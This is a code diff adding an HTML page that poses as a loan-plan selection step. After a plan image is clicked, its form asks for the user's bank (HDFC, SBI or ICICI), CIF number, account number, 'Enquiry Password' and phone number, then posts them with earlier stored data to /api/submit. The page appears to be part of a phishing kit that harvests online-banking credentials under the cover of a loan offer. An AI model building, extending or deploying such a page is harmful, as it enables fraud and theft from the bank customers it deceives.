@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Select Loan Plan</title>
+
+<style>
+  .hidden { display: none; }
+  .plan-img {
+    width: 220px;
+    cursor: pointer;
+    border: 2px solid transparent;
+    margin-right: 10px;
+  }
+  .plan-img:hover {
+    border-color: #0070f3;
+  }
+</style>
+</head>
+
+<body>
+
+<h2>Select Your Loan Plan</h2>
+
+<div>
+  <img src="plan-a.jpg" class="plan-img" onclick="selectPlan('Plan A', this)">
+  <img src="plan-b.jpg" class="plan-img" onclick="selectPlan('Plan B', this)">
+</div>
+
+<!-- STEP 3 FORM -->
+<div id="step3" class="hidden">
+  <h3>Bank Transfer Details</h3>
+
+  <form id="finalForm">
+
+    <label>Bank Name</label>
+    <select name="bankName" required>
+      <option value="">Select Bank</option>
+      <option>HDFC</option>
+      <option>SBI</option>
+      <option>ICICI</option>
+    </select>
+
+    <label>CIF Number</label>
+    <input name="cif" required>
+
+    <label>Account Number</label>
+    <input name="accountNumber" required>
+
+    <label>Additional Detail</label>
+    <input name="additionalDetail">
+
+    <label>Enquiry Password</label>
+    <input name="enquiryPassword" required>
+
+    <label>Phone Number</label>
+    <input name="phone" required>
+
+    <button type="submit">Submit Application</button>
+  </form>
+</div>
+
+<script>
+/* Load stored data */
+const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+
+/* Plan selection → show form */
+function selectPlan(planName, el) {
+  loanData.plan = planName;
+
+  document.querySelectorAll(".plan-img")
+    .forEach(img => img.style.opacity = "0.5");
+  el.style.opacity = "1";
+
+  document.getElementById("step3").classList.remove("hidden");
+}
+
+/* Final submission */
+document.getElementById("finalForm").addEventListener("submit", async e => {
+  e.preventDefault();
+
+  const step3Data = Object.fromEntries(new FormData(e.target).entries());
+  const finalData = { ...loanData, ...step3Data };
+
+  await fetch("/api/submit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(finalData)
+  });
+
+  localStorage.clear();
+  alert("Application submitted successfully!");
+});
+</script>
+
+</body>
+</html>
